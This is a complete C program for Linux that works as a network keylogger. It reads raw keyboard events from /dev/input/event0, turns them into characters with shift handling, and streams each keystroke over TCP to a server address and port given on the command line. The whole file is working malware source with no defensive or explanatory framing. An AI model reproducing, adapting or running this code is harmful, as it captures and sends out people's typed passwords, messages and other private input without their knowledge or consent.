#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <string.h>
#include <arpa/inet.h>
#include <signal.h>

// --- Map normal keys ---
const char *keymap[256] = {
    [KEY_A]="a",[KEY_B]="b",[KEY_C]="c",[KEY_D]="d",
    [KEY_E]="e",[KEY_F]="f",[KEY_G]="g",[KEY_H]="h",
    [KEY_I]="i",[KEY_J]="j",[KEY_K]="k",[KEY_L]="l",
    [KEY_M]="m",[KEY_N]="n",[KEY_O]="o",[KEY_P]="p",
    [KEY_Q]="q",[KEY_R]="r",[KEY_S]="s",[KEY_T]="t",
    [KEY_U]="u",[KEY_V]="v",[KEY_W]="w",[KEY_X]="x",
    [KEY_Y]="y",[KEY_Z]="z",
    [KEY_1]="1",[KEY_2]="2",[KEY_3]="3",[KEY_4]="4",
    [KEY_5]="5",[KEY_6]="6",[KEY_7]="7",[KEY_8]="8",
    [KEY_9]="9",[KEY_0]="0",
    [KEY_ENTER]="\n",[KEY_SPACE]=" ",
    [KEY_DOT]=".",[KEY_COMMA]=",",
    [KEY_MINUS]="-",[KEY_EQUAL]="=",
    [KEY_BACKSPACE] = "\b"
};

// --- Map shifted keys (Shift or CapsLock) ---
const char *shifted_keymap[256] = {
    [KEY_A]="A",[KEY_B]="B",[KEY_C]="C",[KEY_D]="D",
    [KEY_E]="E",[KEY_F]="F",[KEY_G]="G",[KEY_H]="H",
    [KEY_I]="I",[KEY_J]="J",[KEY_K]="K",[KEY_L]="L",
    [KEY_M]="M",[KEY_N]="N",[KEY_O]="O",[KEY_P]="P",
    [KEY_Q]="Q",[KEY_R]="R",[KEY_S]="S",[KEY_T]="T",
    [KEY_U]="U",[KEY_V]="V",[KEY_W]="W",[KEY_X]="X",
    [KEY_Y]="Y",[KEY_Z]="Z",
    [KEY_1]="!",[KEY_2]="@",[KEY_3]="#",[KEY_4]="$",
    [KEY_5]="%",[KEY_6]="^",[KEY_7]="&",[KEY_8]="*",
    [KEY_9]="(",[KEY_0]=")",
    [KEY_ENTER]="\n",[KEY_SPACE]=" ",
    [KEY_DOT]=">",[KEY_COMMA]="<",
    [KEY_MINUS]="_",[KEY_EQUAL]="+",
    [KEY_BACKSPACE] = "\b"
};

int fd = -1, sock = -1;
int shift_pressed = 0;

// --- Cleanup on Ctrl+C ---
void handle_sigint(int sig) {
    printf("\nExiting...\n");
    if (sock >= 0) close(sock);
    if (fd >= 0) close(fd);
    exit(0);
}

int main(int argc, char **argv) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <server_ip> <port>\n", argv[0]);
        return 1;
    }

    char *server_ip = argv[1];
    int port = atoi(argv[2]);
    signal(SIGINT, handle_sigint);

    // --- Open keyboard input ---
    fd = open("/dev/input/event0", O_RDONLY);
    if (fd < 0) {
        perror("open /dev/input/event0");
        return 1;
    }

    // --- Connect to TCP server ---
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { perror("socket"); return 1; }

    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, server_ip, &serv_addr.sin_addr) <= 0) {
        perror("inet_pton");
        return 1;
    }

    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("connect");
        return 1;
    }

    // --- Event loop ---
    struct input_event ev;
    while (1) {
        if (read(fd, &ev, sizeof(ev)) != sizeof(ev))
            continue;

        if (ev.type == EV_KEY) {
            // Track shift state
            if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                shift_pressed = (ev.value == 1);
            }
            // Handle key press
            else if (ev.value == 1){
                // if (ev.code == KEY_BACKSPACE)
                //     send(sock, "\b", 1, 0);
                // else{
                const char *c = shift_pressed ? shifted_keymap[ev.code] : keymap[ev.code];
                if (c)
                    send(sock, c, strlen(c), 0);
                // }
            }
        }
    }

    handle_sigint(0);
    return 0;
}
